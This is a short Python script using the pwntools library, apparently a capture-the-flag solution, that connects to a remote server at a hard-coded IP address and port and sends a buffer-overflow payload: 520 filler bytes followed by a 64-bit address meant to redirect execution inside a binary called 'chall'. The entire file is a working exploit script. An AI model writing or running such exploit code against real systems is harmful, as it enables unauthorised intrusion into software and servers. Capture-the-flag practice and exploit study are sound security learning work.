#!/usr/bin/python3

from pwn import *

elf = ELF('./chall')

io = remote("167.71.207.218", 50602)
#io = elf.process()

payload = b'A' * 520
payload += p64(0x400879)

io.clean()

io.sendline(payload)

print(io.recv())
print(io.recv())
